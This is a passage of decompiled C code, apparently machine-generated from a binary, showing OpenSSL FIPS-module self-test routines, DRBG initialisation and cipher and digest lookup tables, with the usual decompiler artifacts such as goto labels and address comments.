    if ((int32_t)v24 != 0) {
        // 0x485cf8
        v19 = (int64_t)str;
        v20 = len;
        int64_t v25 = EVP_DigestUpdate(&v2, v19, v20); // 0x485d06
        v14 = v19;
        v15 = 0;
        if ((int32_t)v25 == 0) {
            goto lab_0x485c43;
        } else {
            int64_t v26 = EVP_SignFinal(v3, v9, (int64_t)&v22, a1, v6); // 0x485d21
            v14 = v9;
            v15 = 0;
            if ((int32_t)v26 == 0) {
                goto lab_0x485c43;
            } else {
                // 0x485d2e
                v17 = a1;
                if (a4 == 0) {
                    goto lab_0x485d59;
                } else {
                    // 0x485d36
                    v14 = v9;
                    v15 = 0;
                    if (v22 != a5) {
                        goto lab_0x485c43;
                    } else {
                        // 0x485d44
                        bool v27; // 0x485b90
                        int64_t v28 = v27 ? -1 : 1;
                        int64_t v29 = v9; // 0x485d51
                        int64_t v30 = a5; // 0x485d51
                        int64_t v31 = v7; // 0x485d51
                        v17 = 0;
                        while (v30 != 0) {
                            int64_t v32 = v31;
                            char v33 = *(char *)v29; // 0x485d51
                            v31 = v32 + v28;
                            v14 = v31;
                            v15 = 0;
                            v29 += v28;
                            v30--;
                            if (*(char *)v32 != v33) {
                                goto lab_0x485c43;
                            }
                            v17 = 0;
                        }
                        goto lab_0x485d59;
                    }
                }
            }
        }
    } else {
        goto lab_0x485c43;
    }
  lab_0x485ca3:
    // 0x485ca3
    if (v4 != __readfsqword(40)) {
        // 0x485e4d
        __stack_chk_fail();
        return &g299;
    }
    // 0x485cba
    return result;
  lab_0x485d59:;
    int64_t v16 = EVP_DigestInit_ex(&v2, v5, 0, v17, v6); // 0x485d61
    v14 = v5;
    v15 = 0;
    if ((int32_t)v16 != 0) {
        int64_t v18 = EVP_DigestUpdate(&v2, v19, v20); // 0x485d79
        v14 = v19;
        v15 = 0;
        if ((int32_t)v18 != 0) {
            int64_t v21 = EVP_VerifyFinal(&v2, v9, v22, a1, v6); // 0x485d93
            v14 = v9;
            v15 = v21;
        }
    }
    goto lab_0x485c43;
}

// Address range: 0x485e60 - 0x485f16
int64_t FIPS_selftest(void) {
    // 0x485e60
    int64_t v1; // 0x485e60
    int64_t v2; // 0x485e60
    int64_t v3 = FIPS_selftest_drbg(v1, v2); // 0x485e68
    int64_t v4 = FIPS_selftest_x931(); // 0x485e6f
    int64_t v5 = FIPS_selftest_sha1(); // 0x485e81
    int64_t v6; // 0x485e60
    int64_t v7; // 0x485e60
    int64_t v8; // 0x485e60
    int64_t v9; // 0x485e60
    int64_t v10 = FIPS_selftest_sha2(v1, v2, v8, v9, v7, v6); // 0x485e8b
    int64_t v11 = FIPS_selftest_hmac(); // 0x485e95
    int64_t v12 = FIPS_selftest_cmac(); // 0x485e9f
    int64_t v13 = FIPS_selftest_aes(v1, v2, v8, v9); // 0x485ea9
    int64_t v14 = FIPS_selftest_aes_ccm(v1, v2, v8, v9, v7); // 0x485eb3
    int64_t v15 = FIPS_selftest_aes_gcm(v1, v2, v8, v9, v7); // 0x485ebd
    int64_t v16 = FIPS_selftest_aes_xts(); // 0x485ec7
    int64_t v17 = FIPS_selftest_des(); // 0x485ed1
    int64_t v18 = FIPS_selftest_rsa(); // 0x485edb
    int64_t v19 = FIPS_selftest_ecdsa(v1, v2, v8, v9, v7); // 0x485ee5
    int64_t v20 = FIPS_selftest_dsa(v1, v2, v8, v9, v7); // 0x485eef
    int64_t v21 = FIPS_selftest_dh(); // 0x485ef9
    return (int32_t)v3 != 0 == ((int32_t)v4 != 0) == !(((int32_t)FIPS_selftest_ecdh(v1, v2, v8, v9, v7) == 0 | (int32_t)v21 == 0 | (int32_t)v20 == 0 | (int32_t)v19 == 0 | (int32_t)v18 == 0 | (int32_t)v17 == 0 | (int32_t)v16 == 0 | (int32_t)v15 == 0 | (int32_t)v14 == 0 | (int32_t)v13 == 0 | (int32_t)v12 == 0 | (int32_t)v11 == 0 | (int32_t)v5 == 0 | (int32_t)v10 == 0));
}

// Address range: 0x485f20 - 0x4860f0
int64_t fips_cipher_test(int64_t * a1, int64_t a2, int64_t * a3, int64_t * a4, int64_t * a5, int64_t * a6, int32_t a7) {
    int64_t v1 = __readfsqword(40); // 0x485f4b
    if (a7 > 32) {
        // 0x486070
        OpenSSLDie("fips_post.c", 193, "len <= FIPS_MAX_CIPHER_TEST_SIZE");
        // UNREACHABLE
    }
    int64_t v2 = (int64_t)a1;
    int64_t v3 = 0; // bp-104, 0x485f97
    int64_t v4 = 0; // bp-136, 0x485fc0
    int32_t v5 = (int64_t)a3; // 0x485fe4
    int32_t v6 = (int64_t)a4; // 0x485fe4
    int64_t result = 0; // 0x485feb
    if ((int32_t)EVP_CipherInit_ex(v2, a2, 0, v5, v6, 1) >= 1) {
        int64_t v7 = (int64_t)a5;
        int64_t v8 = EVP_Cipher(v2, &v4, v7, a7); // 0x485fff
        result = 0;
        if ((int32_t)v8 >= 1) {
            int64_t v9 = a7; // 0x486008
            int64_t v10 = &v4; // 0x486015
            bool v11; // 0x485f20
            int64_t v12 = v11 ? -1 : 1;
            int64_t v13 = v9; // 0x48601e
            int64_t v14 = v10; // 0x48601e
            int64_t v15 = (int64_t)a6; // 0x48601e
            while (v13 != 0) {
                int64_t v16 = v14;
                char v17 = *(char *)v15; // 0x48601e
                v13--;
                v14 = v16 + v12;
                v15 += v12;
                result = 0;
                if (*(char *)v16 != v17) {
                    goto lab_0x486024;
                }
            }
            // 0x486090
            result = 0;
            if ((int32_t)EVP_CipherInit_ex(v2, a2, 0, v5, v6, 0) >= 1) {
                int64_t v18 = EVP_Cipher(v2, &v3, v10, a7); // 0x4860c0
                result = 0;
                if ((int32_t)v18 >= 1) {
                    int64_t v19 = v9; // 0x4860dd
                    int64_t v20 = &v3; // 0x4860dd
                    int64_t v21 = v7; // 0x4860dd
                    result = 1;
                    while (v19 != 0) {
                        int64_t v22 = v20;
                        char v23 = *(char *)v21; // 0x4860dd
                        result = 0;
                        v19--;
                        v20 = v22 + v12;
                        v21 += v12;
                        if (*(char *)v22 != v23) {
                            // break -> 0x486024
                            break;
                        }
                        result = 1;
                    }
                }
            }
        }
    }
  lab_0x486024:
    // 0x486024
    if (v1 == __readfsqword(40)) {
        // 0x486038
        return result;
    }
    // 0x4860ea
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x4860f0 - 0x48623a
int64_t fips_drbg_ctr_init(int64_t a1) {
    int64_t v1 = 32; // 0x4860f0
    int64_t v2 = 16; // 0x4860f0
    int64_t v3 = 128; // 0x4860f0
    int64_t v4; // 0x4860f0
    switch ((int32_t)v4) {
        case 905: {
            // 0x4861d8
            v1 = 40;
            v2 = 24;
            v3 = 192;
        }
        case 904: {
          lab_0x48612f:;
            int64_t * v5 = (int64_t *)(a1 + 368); // 0x48613a
            *v5 = v2;
            *(int32_t *)(a1 + 20) = (int32_t)v3;
            *(int64_t *)(a1 + 24) = 16;
            *(int64_t *)(a1 + 992) = 0x486910;
            *(int64_t *)(a1 + 96) = v1;
            *(int64_t *)(a1 + 1000) = 0x4868f0;
            *(int64_t *)(a1 + 1008) = 0x4869e0;
            *(int64_t *)(a1 + 1016) = 0x486240;
            if (*(char *)(a1 + 4) % 2 != 0) {
                // 0x4861f0
                AES_set_encrypt_key((int64_t)&g183, v3, (int64_t *)(a1 + 424));
                uint64_t v6 = *v5; // 0x486203
                *(int64_t *)(a1 + 48) = 0x7ffffff0;
                *(int64_t *)(a1 + 64) = 0x7ffffff0;
                *(int64_t *)(a1 + 72) = 0x7ffffff0;
                *(int64_t *)(a1 + 80) = 0x7ffffff0;
                *(int64_t *)(a1 + 40) = v6;
                *(int64_t *)(a1 + 56) = v6 / 2;
            } else {
                // 0x486183
                *(int64_t *)(a1 + 40) = v1;
                *(int64_t *)(a1 + 48) = v1;
                *(int64_t *)(a1 + 56) = 0;
                *(int64_t *)(a1 + 64) = 0;
                *(int64_t *)(a1 + 72) = v1;
                *(int64_t *)(a1 + 80) = v1;
            }
            // break -> 0x4861a3
            break;
        }
        case 906: {
            // 0x4861c0
            v1 = 48;
            v2 = 32;
            v3 = 256;
            // branch (via goto) -> 0x48612f
            goto lab_0x48612f;
        }
        default: {
            // 0x48611b
            return 0xfffffffe;
        }
    }
    // 0x4861a3
    *(int64_t *)(a1 + 32) = 0x10000;
    *(int32_t *)(a1 + 92) = 0x1000000;
    return 1;
}

// Address range: 0x486b80 - 0x486c94
int64_t fips_drbg_hash_init(int64_t a1) {
    // 0x486b80
    int64_t v1; // 0x486b80
    int32_t v2 = v1;
    int64_t v3 = FIPS_get_digestbynid(v2); // 0x486b8b
    if (v3 == 0) {
        // 0x486c7a
        return 0xfffffffe;
    }
    int32_t * v4; // 0x486b80
    if (v2 == 64) {
        int32_t * v5 = (int32_t *)(a1 + 20);
        *v5 = 128;
        v4 = v5;
    } else {
        int32_t * v6 = (int32_t *)(a1 + 20);
        *v6 = v2 == 675 ? 192 : 256;
        v4 = v6;
    }
    // 0x486bc2
    *(int64_t *)(a1 + 120) = v3;
    *(int64_t *)(a1 + 992) = 0x486ef0;
    *(int64_t *)(a1 + 1000) = 0x486f90;
    *(int64_t *)(a1 + 1008) = 0x487190;
    *(int64_t *)(a1 + 1016) = 0x486ca0;
    EVP_MD_CTX_init(a1 + 128);
    int64_t v7 = 0x100000000 * EVP_MD_size(v3) / 0x100000000; // 0x486c12
    *(int64_t *)(a1 + 48) = 0x7ffffff0;
    *(int64_t *)(a1 + 64) = 0x7ffffff0;
    *(int64_t *)(a1 + 24) = v7;
    *(int64_t *)(a1 + 72) = 0x7ffffff0;
    *(int64_t *)(a1 + 80) = 0x7ffffff0;
    *(int64_t *)(a1 + 32) = 0x10000;
    *(int32_t *)(a1 + 92) = 0x1000000;
    *(int64_t *)(a1 + 96) = v7 < 33 ? 55 : 111;
    uint64_t v8 = (int64_t)(*v4 / 128); // 0x486c68
    *(int64_t *)(a1 + 40) = v8;
    *(int64_t *)(a1 + 56) = v8 / 2;
    // 0x486c7a
    return 1;
}

// Address range: 0x487410 - 0x487585
int64_t fips_drbg_hmac_init(int64_t a1) {
    int32_t v1 = a1;
    int32_t * v2 = (int32_t *)(a1 + 20); // 0x48741b
    *v2 = 256;
    int64_t v3; // 0x487410
    if (v1 == 799) {
        // 0x487578
        v3 = EVP_sha256();
    } else {
        if (v1 > 799) {
            switch (v1) {
                case 800: {
                    // 0x487550
                    v3 = EVP_sha384();
                    // break -> 0x487481
                    break;
                }
                case 801: {
                    // 0x487540
                    int64_t v4; // 0x487410
                    v3 = EVP_sha512(a1, v4);
                    // break -> 0x487481
                    break;
                }
                default: {
                    // 0x487445
                    *v2 = 0;
                    return 0xfffffffe;
                }
            }
        } else {
            if (v1 == 163) {
                int64_t v5 = EVP_sha1(); // 0x487560
                *v2 = 128;
                v3 = v5;
            } else {
                if (v1 != 798) {
                    // 0x487445
                    *v2 = 0;
                    return 0xfffffffe;
                }
                int64_t v6 = EVP_sha224(); // 0x487472
                *v2 = 192;
                v3 = v6;
            }
        }
    }
    // 0x487481
    *(int64_t *)(a1 + 992) = 0x487a90;
    *(int64_t *)(a1 + 1000) = 0x4878a0;
    *(int64_t *)(a1 + 1008) = 0x4878d0;
    *(int64_t *)(a1 + 1016) = 0x487590;
    HMAC_CTX_init((int64_t *)(a1 + 128));
    *(int64_t *)(a1 + 120) = v3;
    *(int64_t *)(a1 + 24) = 0x100000000 * EVP_MD_size(v3) / 0x100000000;
    int64_t v7 = EVP_MD_size(v3); // 0x4874da
    *(int64_t *)(a1 + 48) = 0x7ffffff0;
    *(int64_t *)(a1 + 64) = 0x7ffffff0;
    *(int64_t *)(a1 + 96) = 0x100000000 * v7 / 0x100000000;
    *(int64_t *)(a1 + 72) = 0x7ffffff0;
    *(int64_t *)(a1 + 80) = 0x7ffffff0;
    *(int64_t *)(a1 + 32) = 0x10000;
    *(int32_t *)(a1 + 92) = 0x1000000;
    uint64_t v8 = (int64_t)(*v2 / 128); // 0x487522
    *(int64_t *)(a1 + 40) = v8;
    *(int64_t *)(a1 + 56) = v8 / 2;
    return 1;
}

// Address range: 0x487b30 - 0x487c90
int64_t FIPS_selftest_cmac(void) {
    int64_t v1 = __readfsqword(40); // 0x487b52
    int64_t v2 = CMAC_CTX_new(); // 0x487b62
    int64_t v3 = FIPS_get_cipherbynid(419); // 0x487b76
    int64_t v4; // 0x487b30
    int64_t v5; // 0x487b30
    if (v3 != 0) {
        // 0x487b84
        int64_t v6; // bp-104, 0x487b30
        int64_t v7 = &v6;
        bool v8; // 0x487b30
        int64_t v9 = v8 ? -1 : 1;
        int64_t v10 = v3; // 0x487c0b
        int64_t v11 = 1; // 0x487b30
        int64_t v12 = &g4;
        uint64_t v13 = *(int64_t *)(v12 + 72); // 0x487b84
        while ((int32_t)CMAC_Init(v2, v12 + 4, v13 / 8, v10, 0) != 0) {
            uint64_t v14 = *(int64_t *)(v12 + 144); // 0x487ba2
            if ((int32_t)CMAC_Update(v2, v12 + 80, v14 / 8) == 0) {
                // break -> 0x487c20
                break;
            }
            // 0x487bbd
            int64_t v15; // bp-112, 0x487b30
            if ((int32_t)CMAC_Final(v2, v7, (int64_t)&v15) == 0) {
                // break -> 0x487c20
                break;
            }
            // 0x487bcf
            CMAC_CTX_cleanup(v2);
            uint64_t v16 = *(int64_t *)(v12 + 184) / 8; // 0x487bde
            int64_t v17 = 0; // 0x487be7
            if (v16 <= v15) {
                int64_t v18 = v7; // 0x487bf6
                int64_t v19 = v12 + 152; // 0x487bf6
                int64_t v20 = v16; // 0x487b30
                v17 = v11;
                while (v20 != 0) {
                    int64_t v21 = v18;
                    char v22 = *(char *)v19; // 0x487bf6
                    v20--;
                    v18 = v21 + v9;
                    v19 += v9;
                    v17 = 0;
                    if (*(char *)v21 != v22) {
                        // break -> 0x487bfd
                        break;
                    }
                    v17 = v11;
                }
            }
            // 0x487bfd
            v4 = v17;
            if (v12 == (int64_t)&g5) {
                // 0x487c50
                CMAC_CTX_free(v2);
                v5 = v4;
                if ((int32_t)v4 == 0) {
                    goto lab_0x487c2b;
                } else {
                    goto lab_0x487c5d;
                }
            }
            int64_t v23 = v12 + 192; // 0x487c02
            v10 = FIPS_get_cipherbynid(*(int32_t *)v23);
            v11 = v4;
            if (v10 == 0) {
                // break -> 0x487c20
                break;
            }
            v12 = v23;
            v13 = *(int64_t *)(v12 + 72);
        }
    }
    // 0x487c20
    CMAC_CTX_free(v2);
    v4 = 0;
    goto lab_0x487c2b;
  lab_0x487c2b:
    // 0x487c2b
    ERR_put_error(45, 130, 101, "fips_cmac_selftest.c", 157);
    v5 = v4;
    goto lab_0x487c5d;
  lab_0x487c5d:
    // 0x487c5d
    if (v1 == __readfsqword(40)) {
        // 0x487c70
        return v5 & 0xffffffff;
    }
    // 0x487c7f
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x487c90 - 0x487eed
int64_t FIPS_selftest_ecdh(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5) {
    int64_t v1 = CRYPTO_malloc((int64_t)(uint32_t)g196, "fips_ecdh_selftest.c", 146, a4, a5); // 0x487cb0
    int64_t v2 = BN_bin2bn((int64_t)g185, g186, 0); // 0x487cc7
    int64_t v3 = BN_bin2bn((int64_t)g187, g188, 0); // 0x487cde
    int64_t v4 = g190; // 0x487ce3
    int64_t v5 = BN_bin2bn((int64_t)g189, g190, 0); // 0x487cf5
    int64_t v6 = 0xffffffff; // 0x487d00
    int64_t v7 = 0; // 0x487d00
    int64_t v8 = v3; // 0x487d00
    int64_t v9 = v4; // 0x487d00
    int64_t v10 = v2; // 0x487d00
    int64_t v11 = v1; // 0x487d00
    int64_t v12; // 0x487c90
    int64_t v13; // 0x487c90
    int64_t v14; // 0x487c90
    int64_t v15; // 0x487c90
    int64_t v16; // 0x487c90
    int64_t v17; // 0x487c90
    int64_t v18; // 0x487c90
    if (v1 == 0 || v2 == 0 || v3 == 0 || v5 == 0) {
        goto lab_0x487e5b;
    } else {
        int64_t v19 = EC_KEY_new_by_curve_name(g184); // 0x487d27
        v14 = v1;
        v13 = 0;
        v12 = v2;
        v17 = v4;
        v15 = v3;
        v16 = 0;
        v18 = 0xffffffff;
        if (v19 == 0) {
            goto lab_0x487e60;
        } else {
            // 0x487d38
            EC_KEY_set_flags(v19, 0x1000);
            int64_t v20 = EC_KEY_set_public_key_affine_coordinates(v19, v2, v3); // 0x487d4e
            v14 = v1;
            v13 = 0;
            v12 = v2;
            v17 = v2;
            v15 = v3;
            v16 = v19;
            v18 = 0xffffffff;
            if ((int32_t)v20 == 0) {
                goto lab_0x487e60;
            } else {
                int64_t v21 = EC_KEY_set_private_key(v19, v5); // 0x487d61
                v14 = v1;
                v13 = 0;
                v12 = v2;
                v17 = v5;
                v15 = v3;
                v16 = v19;
                v18 = 0xffffffff;
                if ((int32_t)v21 == 0) {
                    goto lab_0x487e60;
                } else {
                    int64_t v22 = BN_bin2bn((int64_t)g191, g192, (int32_t)v2); // 0x487d7e
                    int64_t v23 = g194; // 0x487d83
                    int64_t v24 = BN_bin2bn((int64_t)g193, g194, (int32_t)v3); // 0x487d96
                    v6 = 0xffffffff;
                    v7 = v19;
                    v8 = v24;
                    v9 = v23;
                    v10 = v22;
                    v11 = v1;
                    if (v22 == 0 || v24 == 0) {
                        goto lab_0x487e5b;
                    } else {
                        int64_t v25 = EC_KEY_new_by_curve_name(g184); // 0x487db6
                        v14 = v1;
                        v13 = 0;
                        v12 = v22;
                        v17 = v23;
                        v15 = v24;
                        v16 = v19;
                        v18 = 0xffffffff;
                        if (v25 == 0) {
                            goto lab_0x487e60;
                        } else {
                            // 0x487dc7
                            EC_KEY_set_flags(v19, 0x1000);
                            int64_t v26 = EC_KEY_set_public_key_affine_coordinates(v25, v22, v24); // 0x487ddd
                            v14 = v1;
                            v13 = v25;
                            v12 = v22;
                            v17 = v22;
                            v15 = v24;
                            v16 = v19;
                            v18 = 0xffffffff;
                            if ((int32_t)v26 == 0) {
                                goto lab_0x487e60;
                            } else {
                                int64_t v27 = EC_KEY_get0_public_key(v25); // 0x487ded
                                v14 = v1;
                                v13 = v25;
                                v12 = v22;
                                v17 = v22;
                                v15 = v24;
                                v16 = v19;
                                v18 = 0xffffffff;
                                if (v27 == 0) {
                                    goto lab_0x487e60;
                                } else {
                                    int64_t v28 = g196; // 0x487dfb
                                    int64_t v29 = ECDH_compute_key(v1, v28, v27, v19, 0); // 0x487e0e
                                    v14 = v1;
                                    v13 = v25;
                                    v12 = v22;
                                    v17 = v28;
                                    v15 = v24;
                                    v16 = v19;
                                    v18 = 0xffffffff;
                                    if ((int32_t)v29 == 0) {
                                        goto lab_0x487e60;
                                    } else {
                                        // 0x487e1b
                                        bool v30; // 0x487c90
                                        int64_t v31 = v30 ? -1 : 1;
                                        int64_t v32 = g196; // 0x487e2f
                                        int64_t v33 = (int64_t)g195; // 0x487e2f
                                        int64_t v34 = v1;
                                        int64_t v35 = 1; // 0x487e2f
                                        int64_t v36 = v34; // 0x487e2f
                                        while (v32 != 0) {
                                            char v37 = *(char *)v33; // 0x487e2f
                                            int64_t v38 = v34 + v31; // 0x487e2f
                                            v32--;
                                            v33 += v31;
                                            v35 = 0;
                                            v36 = v38;
                                            if (*(char *)v34 != v37) {
                                                // break ->
                                                break;
                                            }
                                            v34 = v38;
                                            v35 = 1;
                                            v36 = v34;
                                        }
                                        EC_KEY_free(v19);
                                        EC_KEY_free(v25);
                                        CRYPTO_free(v1, v36);
                                        v6 = v35;
                                        v7 = 0;
                                        v8 = v24;
                                        v9 = v36;
                                        v10 = v22;
                                        v11 = 0;
                                        goto lab_0x487e5b;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x487e5b:
    // 0x487e5b
    v14 = v11;
    v13 = 0;
    v12 = v10;
    v17 = v9;
    v15 = v8;
    v16 = v7;
    v18 = v6;
    int64_t v39 = v11; // 0x487e5e
    int64_t v40 = 0; // 0x487e5e
    int64_t v41 = v9; // 0x487e5e
    int64_t v42 = v8; // 0x487e5e
    int64_t v43 = v7; // 0x487e5e
    int64_t result = v6; // 0x487e5e
    if (v10 == 0) {
        goto lab_0x487e68;
    } else {
        goto lab_0x487e60;
    }
  lab_0x487e68:
    // 0x487e68
    if (v42 != 0) {
        // 0x487e6d
        BN_clear_free(v42);
    }
    if (v5 != 0) {
        // 0x487e7a
        BN_clear_free(v5);
    }
    if (v43 != 0) {
        // 0x487e87
        EC_KEY_free(v43);
    }
    if (v40 != 0) {
        // 0x487e94
        EC_KEY_free(v40);
    }
    if (v39 != 0) {
        // 0x487ea1
        CRYPTO_free(v39, v41);
    }
    // 0x487ea9
    return result;
  lab_0x487e60:
    // 0x487e60
    BN_clear_free(v12);
    v39 = v14;
    v40 = v13;
    v41 = v17;
    v42 = v15;
    v43 = v16;
    result = v18;
    goto lab_0x487e68;
}

// Address range: 0x487ef0 - 0x4880a8
int64_t FIPS_selftest_ecdsa(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5) {
    int64_t v1 = BN_bin2bn((int64_t)g199, g200, 0); // 0x487f21
    int64_t v2 = BN_bin2bn((int64_t)g201, g202, 0); // 0x487f38
    int64_t v3 = BN_bin2bn((int64_t)g203, g204, 0); // 0x487f4f
    int64_t v4 = 0; // 0x487f5a
    int64_t v5 = 0; // 0x487f5a
    int64_t result = 0; // 0x487f5a
    int64_t v6; // 0x487f78
    int64_t v7; // 0x487fb2
    if (v1 == 0 || v2 == 0 || v3 == 0) {
        goto lab_0x48800d;
    } else {
        // 0x487f72
        v6 = EC_KEY_new_by_curve_name(g197);
        v4 = 0;
        v5 = 0;
        result = 0;
        if (v6 == 0) {
            goto lab_0x48800d;
        } else {
            int64_t v8 = EC_KEY_set_public_key_affine_coordinates(v6, v1, v2); // 0x487f92
            v4 = 0;
            v5 = v6;
            result = 0;
            if ((int32_t)v8 == 0) {
                goto lab_0x48800d;
            } else {
                int64_t v9 = EC_KEY_set_private_key(v6, v3); // 0x487fa5
                v4 = 0;
                v5 = v6;
                result = 0;
                if ((int32_t)v9 == 0) {
                    goto lab_0x48800d;
                } else {
                    // 0x487fb2
                    v7 = EVP_PKEY_new(v6, v3, v2);
                    if (v7 == 0) {
                        goto lab_0x4880a0;
                    } else {
                        // 0x487fc3
                        EVP_PKEY_assign(v7, 408, v6);
                        int64_t v10 = fips_pkey_signature_test(v7, NULL, 0, 0, 0, (int32_t)EVP_sha256(), 0, (int64_t)g198); // 0x487ffa
                        v4 = v7;
                        v5 = v6;
                        result = 1;
                        if ((int32_t)v10 == 0) {
                            goto lab_0x4880a0;
                        } else {
                            goto lab_0x48800d;
                        }
                    }
                }
            }
        }
    }
  lab_0x48800d:
    // 0x48800d
    if (v1 != 0) {
        // 0x488012
        BN_clear_free(v1);
    }
    if (v2 != 0) {
        // 0x48801f
        BN_clear_free(v2);
    }
    if (v3 != 0) {
        // 0x48802c
        BN_clear_free(v3);
    }
    if (v4 == 0) {
        if (v5 != 0) {
            // 0x488075
            EC_KEY_free(v5);
        }
        // 0x488041
        return result;
    }
    // 0x488039
    EVP_PKEY_free(v4);
    // 0x488041
    return result;
  lab_0x4880a0:
    // 0x4880a0
    v4 = v7;
    v5 = v6;
    result = 0;
    goto lab_0x48800d;
}

// Address range: 0x4880b0 - 0x4883ba
int64_t FIPS_get_cipherbynid(int32_t a1) {
    if (a1 == 429) {
        // 0x488308
        return EVP_aes_256_cfb128();
    }
    if ((uint32_t)a1 <= 429) {
        if (a1 == 419) {
            // 0x488310
            return EVP_aes_128_cbc();
        }
        if (a1 > 419) {
            if (a1 == 424) {
                // 0x488298
                return EVP_aes_192_ofb();
            }
            if ((uint32_t)a1 <= 424) {
                if (a1 == 421) {
                    // 0x4882d8
                    return EVP_aes_128_cfb128();
                }
                if (a1 < 421) {
                    // 0x4882d0
                    return EVP_aes_128_ofb();
                }
                switch (a1) {
                    case 422: {
                        // 0x4882ca
                        return EVP_aes_192_ecb();
                    }
                    case 423: {
                        // 0x4882c5
                        return EVP_aes_192_cbc();
                    }
                }
                // 0x488210
                return 0;
            }
            if (a1 == 426) {
                // 0x4882b8
                return EVP_aes_256_ecb();
            }
            if (a1 < 426) {
                // 0x4882b0
                return EVP_aes_192_cfb128();
            }
            if (a1 == 427) {
                // 0x4882dd
                return EVP_aes_256_cbc();
            }
            if (a1 == 428) {
                // 0x488166
                return EVP_aes_256_ofb();
            }
            // 0x488210
            return 0;
        }
        if (a1 == 60) {
            // 0x4882a0
            return EVP_des_ede_cfb64();
        }
        if (a1 > 60) {
            if (a1 == 62) {
                // 0x488328
                return EVP_des_ede_ofb();
            }
            if (a1 < 62) {
                // 0x488320
                return EVP_des_ede3_cfb64();
            }
            if (a1 == 63) {
                // 0x488285
                return EVP_des_ede3_ofb();
            }
            if (a1 == 418) {
                // 0x4881d7
                return EVP_aes_128_ecb();
            }
            // 0x488210
            return 0;
        }
        if (a1 == 33) {
            // 0x4882a8
            return EVP_des_ede3();
        }
        if ((uint32_t)a1 <= 33) {
            if (a1 == 32) {
                // 0x48822c
                return EVP_des_ede();
            }
            // 0x488210
            return 0;
        }
        if (a1 == 43) {
            // 0x4883b5
            return EVP_des_ede_cbc();
        }
        if (a1 == 44) {
            // 0x4883ae
            return EVP_des_ede3_cbc();
        }
        // 0x488210
        return 0;
    }
    if (a1 == 896) {
        // 0x488318
        return EVP_aes_128_ccm();
    }
    if (a1 > 896) {
        if (a1 == 904) {
            // 0x488280
            return EVP_aes_128_ctr();
        }
        if (a1 > 904) {
            if (a1 == 906) {
                // 0x4882f8
                return EVP_aes_256_ctr();
            }
            if (a1 < 906) {
                // 0x4882f0
                return EVP_aes_192_ctr();
            }
            if (a1 == 913) {
                // 0x4882e5
                return EVP_aes_128_xts();
            }
            if (a1 == 914) {
                // 0x488110
                return EVP_aes_256_xts();
            }
            // 0x488210
            return 0;
        }
        int64_t v1 = a1;
        if (a1 == 899) {
            // 0x4882c0
            return EVP_aes_192_ccm(v1);
        }
        if (a1 <= 899) {
            if (a1 == 898) {
                // 0x488252
                return EVP_aes_192_gcm();
            }
            // 0x488210
            return 0;
        }
        if (a1 == 901) {
            // 0x488351
            return EVP_aes_256_gcm(v1);
        }
        if (a1 == 902) {
            // 0x48834c
            return EVP_aes_256_ccm();
        }
        // 0x488210
        return 0;
    }
    if (a1 == 654) {
        // 0x488300
        return EVP_aes_192_cfb8();
    }
    if (a1 > 654) {
        if (a1 == 658) {
            // 0x488290
            return EVP_des_ede3_cfb1();
        }
        if ((uint32_t)a1 <= 658) {
            if (a1 == 655) {
                // 0x48819e
                return EVP_aes_256_cfb8();
            }
            // 0x488210
            return 0;
        }
        if (a1 == 659) {
            // 0x488399
            return EVP_des_ede3_cfb8();
        }
        if (a1 == 895) {
            // 0x488394
            return EVP_aes_128_gcm();
        }
        // 0x488210
        return 0;
    }
    if (a1 == 651) {
        // 0x488330
        return EVP_aes_192_cfb1();
    }
    if ((uint32_t)a1 <= 651) {
        if (a1 == 650) {
            // 0x48827a
            return EVP_aes_128_cfb1();
        }
        // 0x488210
        return 0;
    }
    if (a1 == 652) {
        // 0x488379
        return EVP_aes_256_cfb1();
    }
    if (a1 == 653) {
        // 0x488374
        return EVP_aes_128_cfb8();
    }
    // 0x488210
    return 0;
}

// Address range: 0x4883c0 - 0x488415
int64_t FIPS_get_digestbynid(int32_t a1) {
    // 0x4883c0
    if (a1 == 673) {
        // 0x488410
        return EVP_sha384();
    }
    if (a1 > 673) {
        switch (a1) {
            case 674: {
                // 0x488400
                int64_t v1; // 0x4883c0
                return EVP_sha512((int64_t)a1, v1);
            }
            case 675: {
                // 0x4883f8
                return EVP_sha224();
            }
        }
        // 0x4883da
        return 0;
    }
    if (a1 == 64) {
        // 0x488408
        return EVP_sha1();
    }
    if (a1 == 672) {
        // 0x4883ed
        return EVP_sha256();
    }
    // 0x4883da
    return 0;
}

// Address range: 0x488420 - 0x48854b
int64_t FIPS_selftest_dh(void) {
    // 0x488420
    int64_t v1; // 0x488420
    int64_t v2 = DH_new(v1); // 0x488438
    if (v2 == 0) {
        // 0x48852d
        int64_t v3; // 0x488420
        CRYPTO_free(0, v3);
        return 0;
    }
    int64_t * v4 = (int64_t *)(v2 + 8); // 0x488449
    int64_t v5 = BN_bin2bn((int64_t)&g15, 256, (int32_t)*v4); // 0x488459
    *v4 = v5;
    int64_t v6 = 0; // 0x488465
    int64_t v7 = 256; // 0x488465
    int64_t v8 = 0; // 0x488465
    if (v5 != 0) {
        int64_t * v9 = (int64_t *)(v2 + 16); // 0x48846b
        int64_t v10 = BN_bin2bn((int64_t)&g16, 1, (int32_t)*v9); // 0x48847b
        *v9 = v10;
        v6 = 0;
        v7 = 1;
        v8 = 0;
        if (v10 != 0) {
            int64_t * v11 = (int64_t *)(v2 + 40); // 0x48848d
            int64_t v12 = BN_bin2bn((int64_t)&g17, 28, (int32_t)*v11); // 0x48849d
            *v11 = v12;
            v6 = 0;
            v7 = 28;
            v8 = 0;
            if (v12 != 0) {
                // 0x4884ab
                v6 = 0;
                v7 = 28;
                v8 = 0;
                if ((int32_t)DH_generate_key(v2) >= 1) {
                    int64_t * v13 = (int64_t *)(v2 + 32); // 0x4884b7
                    int32_t v14 = BN_num_bits(*v13);
                    int32_t v15 = v14 + 7; // 0x4884c4
                    int32_t v16 = v15 >= 0 ? v15 : v14 + 14; // 0x4884d3
                    int64_t v17; // 0x488420
                    int64_t v18; // 0x488420
                    int64_t v19 = CRYPTO_malloc((int64_t)(v16 / 8), "fips_dh_selftest.c", 145, v18, v17); // 0x4884de
                    v6 = 0;
                    v7 = (int64_t)"fips_dh_selftest.c";
                    v8 = 0;
                    if (v19 != 0) {
                        // 0x4884eb
                        BN_bn2bin(*v13, v19);
                        v6 = v19;
                        v7 = v19;
                        v8 = 0;
